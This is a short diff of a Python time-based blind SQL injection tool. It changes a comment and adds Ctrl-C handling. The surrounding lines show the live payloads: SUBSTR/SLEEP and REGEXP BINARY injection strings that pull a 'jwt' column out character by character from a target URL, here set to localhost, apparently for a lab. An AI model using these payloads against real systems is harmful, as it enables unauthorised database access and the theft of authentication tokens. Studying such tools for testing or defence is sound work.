@@ -12,7 +12,7 @@ TARGET = "http://localhost/?id=2$payload$"
 #   '$char$' where the index being tested and current test character will be inserted.
 PAYLOAD = "' AND SUBSTR(jwt, $index$ %2B 1, 1) < '$char$' AND SLEEP(0.2) OR '"
 
-# The payload to match a regular expression, which must sleep if (regex NOT matches).
+# The payload to match a regular expression, which must sleep if regex matches.
 #   Must contain '$regex$' where the regex will be inserted.
 REGEX_PAYLOAD = "' AND SUBSTR(jwt, $index$ %2B 1, 1) REGEXP BINARY '$regex$' AND SLEEP(0.2) OR '"
 
@@ -150,4 +150,7 @@ if __name__ == "__main__":
         print("Missing '$regex$' in REGEX_PAYLOAD config string.")
         sys.exit(5)
 
-    main()
+    try:
+        main()
+    except KeyboardInterrupt:
+        print("\nCancelled by user")
